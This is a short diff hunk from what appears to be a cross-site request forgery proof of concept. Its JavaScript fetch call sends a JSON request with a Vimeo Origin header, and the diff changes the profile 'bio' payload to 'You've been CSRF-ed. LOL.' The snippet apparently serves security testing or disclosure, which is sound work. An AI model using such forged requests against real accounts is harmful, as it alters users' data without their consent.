@@ -14,7 +14,7 @@
                 'Origin': 'https://vimeo.com'
             },
             body: JSON.stringify({
-                bio: "Testing YIPPEE\n"
+                bio: "You've been CSRF-ed. LOL."
             })
         }).then(response => response.text())
           .then(data => console.log(data));
